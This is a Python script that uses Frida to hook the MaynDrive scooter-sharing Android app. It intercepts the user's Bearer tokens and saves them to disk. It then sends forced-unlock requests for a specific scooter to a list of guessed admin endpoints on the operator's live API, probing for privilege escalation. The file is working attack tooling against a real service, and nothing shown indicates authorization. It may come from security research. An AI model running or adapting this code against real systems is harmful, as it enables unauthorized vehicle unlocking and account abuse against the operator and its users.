#!/usr/bin/env python3
"""
Test Admin Scope After Fresh Login
Capture a fresh token and immediately test admin endpoints
"""

import frida
import sys
import json
import time
import subprocess
import os
import re
import requests
from datetime import datetime

PACKAGE_NAME = "fr.mayndrive.app"
SCRIPT_FILE = "capture_WORKING_FINAL.js"
OUTPUT_FILE = "CAPTURED_FRESH_LOGIN.txt"
OUTPUT_JSON = "CAPTURED_FRESH_LOGIN.json"

# API Configuration
BASE_URL = "https://api.knotcity.io"
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 48.8566,
    "lng": 2.3522
}

captured_data = []

def append_record(record):
    captured_data.append(record)
    with open(OUTPUT_JSON, 'w', encoding='utf-8') as jf:
        json.dump(captured_data, jf, indent=2, ensure_ascii=False)

def write_block(title, lines):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        separator = '=' * 80
        f.write(f"\n{separator}\n")
        f.write(f"{title}\n")
        f.write(f"{separator}\n")
        for line in lines:
            f.write(f"{line}\n")
        f.write(f"{separator}\n")

def find_adb():
    """Find adb executable"""
    adb_path = os.environ.get('ADB_PATH')
    if adb_path and os.path.exists(adb_path):
        return adb_path
    
    if os.path.exists("platform-tools/adb.exe"):
        return "platform-tools/adb.exe"
    
    try:
        subprocess.run(["adb", "version"], capture_output=True, check=True)
        return "adb"
    except:
        pass
    
    for root, dirs, files in os.walk("."):
        if "adb.exe" in files:
            return os.path.join(root, "adb.exe")
    
    return None

def restart_frida_server():
    print("[!] Restarting frida-server on device...")
    
    adb_path = find_adb()
    if not adb_path:
        print("[-] adb not found. Please restart frida-server manually.")
        return False
    
    commands = [
        [adb_path, "shell", "su", "-c", "pkill frida-server"],
        [adb_path, "shell", "su", "-c", "/data/local/tmp/frida-server >/dev/null 2>&1 &"]
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        except FileNotFoundError:
            print("[-] adb not found. Please restart frida-server manually.")
            return False
    time.sleep(2)
    print("[+] frida-server restart issued")
    return True

def test_admin_endpoints_with_token(token):
    """Test admin endpoints immediately after getting fresh token"""
    print("\n" + "=" * 80)
    print("[ADMIN TEST] Testing admin endpoints with fresh token")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Admin unlock payload
    admin_payload = {
        "serial_number": SXB306_SCOOTER['serial'],
        "lat": SXB306_SCOOTER['lat'],
        "lng": SXB306_SCOOTER['lng'],
        "force": True
    }
    
    # Test multiple admin endpoint variations
    admin_endpoints = [
        "/api/application/vehicles/unlock/admin",
        "/api/admin/vehicles/unlock",
        "/api/application/admin/vehicles/unlock",
        "/api/vehicles/admin/unlock",
        "/api/admin/unlock",
        "/api/application/vehicles/unlock?admin=true",
        "/api/application/vehicles/unlock?force=true",
        "/api/application/vehicles/unlock?scope=admin",
        "/api/application/vehicles/unlock?role=admin"
    ]
    
    admin_success = False
    
    for endpoint in admin_endpoints:
        print(f"\n[ADMIN TEST] Trying endpoint: {endpoint}")
        print(f"   Payload: {json.dumps(admin_payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json=admin_payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"[SUCCESS] SXB306 ADMIN UNLOCKED via {endpoint}!")
                print("[CRITICAL] ADMIN PRIVILEGE ESCALATION CONFIRMED!")
                admin_success = True
                break
            elif response.status_code == 401:
                print(f"[ERROR] Token expired/invalid")
                break
            elif response.status_code == 403:
                print(f"[ERROR] Admin permission denied")
                continue
            elif response.status_code == 400:
                print(f"[ERROR] Bad request - trying next endpoint...")
                continue
            else:
                print(f"[ERROR] Unexpected response: {response.status_code}")
                continue
                
        except Exception as e:
            print(f"[ERROR] Request failed: {e}")
            continue
    
    return admin_success

def test_regular_unlock_for_comparison(token):
    """Test regular unlock for comparison"""
    print("\n" + "=" * 80)
    print("[COMPARISON] REGULAR UNLOCK TEST")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    regular_payload = {
        "serial_number": SXB306_SCOOTER['serial'],
        "lat": SXB306_SCOOTER['lat'],
        "lng": SXB306_SCOOTER['lng']
    }
    
    print(f"[REGULAR TEST] Trying regular unlock payload:")
    print(f"   {json.dumps(regular_payload, indent=2)}")
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=regular_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"[SUCCESS] SXB306 REGULAR UNLOCK SUCCESSFUL!")
            print("[CRITICAL] VULNERABILITY CONFIRMED!")
            return True
        elif response.status_code == 401:
            print(f"[ERROR] Token expired/invalid")
            return False
        elif response.status_code == 403:
            print(f"[FAILED] Regular unlock failed: 403")
            return False
        else:
            print(f"[ERROR] Unexpected response: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return False

def on_message(message, data):
    if message['type'] == 'send':
        payload = message['payload']
        timestamp = datetime.now().isoformat()
        
        print(f"[{timestamp}] {payload}")
        
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {payload}\n")
        
        if isinstance(payload, dict):
            if payload.get('type') in ['unlock_request', 'lock_request']:
                auth = payload.get('authorization', 'N/A')
                bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
                token_match = re.search(bearer_pattern, auth)
                
                if token_match:
                    token = token_match.group(0)
                    
                    # Save token immediately
                    with open('FRESH_TOKEN.txt', 'w', encoding='utf-8') as f:
                        f.write(token)
                    
                    print(f"[SAVED] Fresh token saved to FRESH_TOKEN.txt")
                    print(f"[TOKEN] {token[:50]}...")
                    
                    # Immediately test admin endpoints with fresh token
                    print(f"\n[IMMEDIATE TEST] Testing admin endpoints with fresh token...")
                    admin_success = test_admin_endpoints_with_token(token)
                    regular_success = test_regular_unlock_for_comparison(token)
                    
                    # Save results
                    results = {
                        "timestamp": timestamp,
                        "token": token,
                        "admin_success": admin_success,
                        "regular_success": regular_success,
                        "payload": payload
                    }
                    
                    with open('ADMIN_TEST_RESULTS.json', 'w', encoding='utf-8') as f:
                        json.dump(results, f, indent=2, ensure_ascii=False)
                    
                    print(f"\n[RESULTS] Admin test results saved to ADMIN_TEST_RESULTS.json")
                    
                    if admin_success:
                        print(f"[CRITICAL] ADMIN PRIVILEGE ESCALATION SUCCESSFUL!")
                        print(f"[WARNING] Fresh login bypassed admin restrictions!")
                    else:
                        print(f"[OK] Admin privilege escalation blocked even with fresh token")
                    
                    if regular_success:
                        print(f"[CRITICAL] Regular unlock successful with fresh token!")
                    else:
                        print(f"[OK] Regular unlock properly blocked")
                    
                else:
                    print(f"[WARNING] Could not extract Bearer token from payload")

def main():
    print("=" * 80)
    print("[+] ADMIN TEST AFTER FRESH LOGIN")
    print("=" * 80)
    print("[!] This script will capture a fresh token and immediately test admin endpoints.")
    print("[!] The theory is that admin scope might work with a fresh login session.")
    print("=" * 80)
    
    if not restart_frida_server():
        print("[ERROR] Failed to restart Frida server")
        return
    
    try:
        device = frida.get_usb_device()
        print(f"[+] Device: {device.name}")
        
        with open(SCRIPT_FILE, 'r', encoding='utf-8') as f:
            script_code = f.read()
        
        # Clear output files
        open(OUTPUT_FILE, 'w').close()
        open(OUTPUT_JSON, 'w').close()
        
        print(f"[*] Spawning {PACKAGE_NAME}...")
        try:
            pid = device.spawn([PACKAGE_NAME])
        except frida.ProcessNotFoundError:
            print(f"[ERROR] App {PACKAGE_NAME} not found. Make sure it's installed.")
            return
        except frida.ProcessNotRespondingError:
            print(f"[ERROR] App {PACKAGE_NAME} not responding. Trying to restart frida-server...")
            if restart_frida_server():
                try:
                    pid = device.spawn([PACKAGE_NAME])
                except Exception as e:
                    print(f"[ERROR] Still failed to spawn app: {e}")
                    return
            else:
                return
        except Exception as e:
            print(f"[ERROR] Failed to spawn app: {e}")
            return
        
        session = device.attach(pid)
        
        # Create script
        script = session.create_script(script_code)
        script.on('message', on_message)
        script.load()
        
        # Resume app
        device.resume(pid)
        print(f"[+] App launched! PID: {pid}")
        
        print("\n" + "=" * 80)
        print("🎯 INSTRUCTIONS FOR FRESH LOGIN ADMIN TEST")
        print("=" * 80)
        print("1. Log in with your FIRST account in the spawned app")
        print("2. Perform an UNLOCK/LOCK operation on a scooter")
        print("3. Watch for immediate admin endpoint testing")
        print("4. Check results in ADMIN_TEST_RESULTS.json")
        print("5. Press Ctrl+C here when you are done")
        print("=" * 80)
        
        sys.stdin.read()
        
    except frida.ServerNotRunningError:
        print("[ERROR] Frida server is not running. Please start it on your device.")
    except frida.TimedOutError:
        print("[ERROR] Timed out waiting for USB device. Is your device connected and authorized?")
    except frida.NotSupportedError:
        print("[ERROR] Device not supported or Frida setup incorrect.")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")
    finally:
        print("\n[OK] Fresh login admin test session ended.")
        if 'session' in locals() and session:
            session.detach()
        print("=" * 80)

if __name__ == "__main__":
    main()
